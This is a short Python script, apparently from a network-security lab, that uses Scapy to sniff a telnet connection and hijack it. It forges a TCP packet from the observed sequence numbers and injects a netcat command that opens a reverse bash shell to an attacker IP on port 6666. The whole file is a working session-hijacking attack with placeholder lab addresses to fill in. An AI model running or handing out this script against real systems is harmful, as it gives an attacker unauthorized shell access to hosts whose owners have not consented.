#!/usr/bin/python3
from scapy.all import *
from scapy.layers.inet import *


server = "10.10.10.189"  # FIXME：Server IP
client = "10.10.10.187"  # FIXME：Client IP
PORT = 23  # Server telnet port


def spoof(pkt):
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]

    ip = IP(src=old_ip.dst, dst=old_ip.src)
    tcp = TCP(sport=old_tcp.dport, dport=old_tcp.sport, seq=old_tcp.ack, ack=old_tcp.seq + len(old_tcp.payload),
              flags="A")
    data = "\rnc 10.10.10.196 6666 -e /bin/bash -- i\r"    # FIXME：Attacker IP

    pkt = ip / tcp / data
    send(pkt, verbose=0)
    ls(pkt)
    quit()


f = 'tcp and src host {} and dst host {} and src port {}'.format(server, client, PORT)
sniff(filter=f, prn=spoof, iface="eth0")



